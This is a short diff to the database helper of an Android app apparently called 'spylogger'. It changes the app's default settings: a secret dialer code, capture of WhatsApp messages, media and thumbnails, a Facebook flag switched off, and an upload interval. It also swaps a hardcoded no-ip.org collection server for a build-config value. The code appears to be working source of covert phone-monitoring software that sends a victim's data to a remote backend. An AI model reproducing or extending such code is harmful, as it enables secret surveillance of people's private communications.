@@ -4,6 +4,7 @@ import android.content.Context;
 import android.database.sqlite.SQLiteDatabase;
 import android.util.Log;
 
+import com.gravatasufoca.spylogger.BuildConfig;
 import com.gravatasufoca.spylogger.R;
 import com.gravatasufoca.spylogger.model.Configuracao;
 import com.gravatasufoca.spylogger.model.Ligacao;
@@ -56,19 +57,16 @@ public class DatabaseHelper extends OrmLiteSqliteOpenHelper {
 
 	}
 
-
 	public void criarConfiguracaoPadrao(){
 		Configuracao configuracao=new Configuracao();
 		configuracao.setDialer("90123");
-		configuracao.setFacebook(true);
+		configuracao.setFacebook(false);
 		configuracao.setWhatsApp(true);
 		configuracao.setMedia(true);
 		configuracao.setMiniatura(true);
 		configuracao.setWifi(true);
 		configuracao.setIntervalo(60);
-		configuracao.setServerUrl("http://gravatasufoca.no-ip.org:8123/smartlog");
-//		configuracao.setServerUrl("http://192.168.1.144:4080/smartlog");
-//		configuracao.setServerUrl("http://192.168.1.118/smartlog");
+		configuracao.setServerUrl(BuildConfig.URL_BACKEND);
 
 		try {
 			getDao(Configuracao.class).create(configuracao);
